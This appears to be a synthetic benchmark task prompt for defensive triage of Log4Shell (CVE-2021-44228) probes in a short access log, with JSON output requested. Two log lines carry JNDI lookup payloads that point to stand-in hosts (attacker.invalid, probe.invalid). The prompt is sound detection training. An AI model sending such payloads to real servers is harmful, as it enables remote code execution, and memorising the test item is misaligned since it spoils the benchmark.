You are analyzing a synthetic incident-response artifact for a sandboxed CyberBench-style RL task.

Goal: identify the Log4Shell-style probing activity in the access log below.
Return only JSON with this exact shape:

{
  "cve": "CVE-2021-44228",
  "vulnerability": "log4shell",
  "source_ips": ["..."],
  "payload_indicators": ["..."],
  "recommended_action": "..."
}

Rules:
- This is defensive log triage only. Do not target any real system.
- Include only IPs that sent JNDI lookup probes.
- Use the evidence in the log; do not invent external facts.

Synthetic access.log:

198.51.100.10 - - [24/Apr/2026:09:00:01 +0000] "GET /health HTTP/1.1" 200 12 "-" "curl/8.4"
203.0.113.42 - - [24/Apr/2026:09:00:07 +0000] "GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.invalid%2Fa%7D HTTP/1.1" 400 41 "-" "Mozilla/5.0"
192.0.2.55 - - [24/Apr/2026:09:00:12 +0000] "POST /login HTTP/1.1" 401 18 "https://example.invalid" "Mozilla/5.0"
198.51.100.77 - - [24/Apr/2026:09:00:15 +0000] "GET /api?x=${jndi:dns://probe.invalid/b} HTTP/1.1" 400 44 "-" "scanner-lab"
198.51.100.10 - - [24/Apr/2026:09:00:20 +0000] "GET /docs?q=jndi HTTP/1.1" 200 140 "-" "curl/8.4"
